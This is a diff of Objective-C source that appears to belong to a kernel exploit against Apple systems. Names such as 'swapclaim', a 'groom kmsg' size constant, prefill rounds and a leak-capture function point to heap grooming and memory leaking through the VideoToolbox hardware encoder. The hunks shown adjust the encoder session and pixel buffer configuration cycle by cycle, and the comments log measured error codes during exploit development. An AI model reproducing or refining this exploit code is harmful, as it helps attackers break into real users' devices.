@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v4.2-h264spec"
+#define P110_BUILD      @"p110-swapclaim-v4.3-smokeconfig"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -696,8 +696,12 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                    (the property route was rejected pre-v4.0). */
                 CMVideoCodecType wCodec = (wc % 2 == 0) ? kCMVideoCodecType_H264
                                                         : kCMVideoCodecType_HEVC;
-                NSDictionary *wSpec = @{
-                    (id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES };
+                /* v4.3: cycle 0 = the EXACT vt_smoke config that is PROVEN to
+                   callback (no spec, plain pb, no properties); cycle 1 adds
+                   RealTime; cycle 2 adds EncoderUsage. One delta per cycle. */
+                NSDictionary *wSpec = (wc == 0)
+                    ? nil
+                    : (NSDictionary *)@{};   /* empty spec = framework default */
                 OSStatus wst = VTCompressionSessionCreate(
                     kCFAllocatorDefault, 1280, 720, wCodec,
                     (__bridge CFDictionaryRef)wSpec, NULL, NULL,
@@ -711,7 +715,9 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                    (the false value kept it on a software path that never
                    completed frames — the measured 0/3). Plus the explicit
                    HW-accel string key and the stage9 RCMode=20 pack. */
-                OSStatus wStUsage = VTSessionSetProperty(ws, (__bridge CFStringRef)@"EncoderUsage",
+                OSStatus wStUsage = -9999;
+                if (wc >= 2)
+                    wStUsage = VTSessionSetProperty(ws, (__bridge CFStringRef)@"EncoderUsage",
                                      (__bridge CFTypeRef)[NSNumber numberWithInt:1]);
                 /* v3.9: RCMode=20 is the AVE2 stage9 pack value — a plain
                    VTCompressionSession may REJECT it (the -12900 class) and
@@ -719,7 +725,9 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                    drop RCMode when it errors. */
                 OSStatus wStRC = -9999;   /* v4.0 DROPPED (v3.9 measured -12900) */
                 OSStatus wStHW = -9999;   /* v4.0 DROPPED (v3.9 measured -12900) */
-                OSStatus wStRT = VTSessionSetProperty(ws, kVTCompressionPropertyKey_RealTime,
+                OSStatus wStRT = -9999;
+                if (wc >= 1)
+                    wStRT = VTSessionSetProperty(ws, kVTCompressionPropertyKey_RealTime,
                                      kCFBooleanTrue);
                 OSStatus wprep = VTCompressionSessionPrepareToEncodeFrames(ws);
                 OSStatus est = -999;
@@ -729,8 +737,9 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                     /* v4.1: the VT hardware encoder requires IOSURFACE-BACKED
                        pixel buffers (v3.9/4.0 passed NULL attrs -> plain
                        memory -> async failure -17691, zero samples). */
-                    NSDictionary *wpbAttrs = @{
-                        (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
+                    NSDictionary *wpbAttrs = (wc == 0)
+                        ? nil    /* v4.3 cycle0: plain pb, exactly like the proven smoke */
+                        : @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
                     if (CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             (__bridge CFDictionaryRef)wpbAttrs, &wpb) == noErr && wpb) {
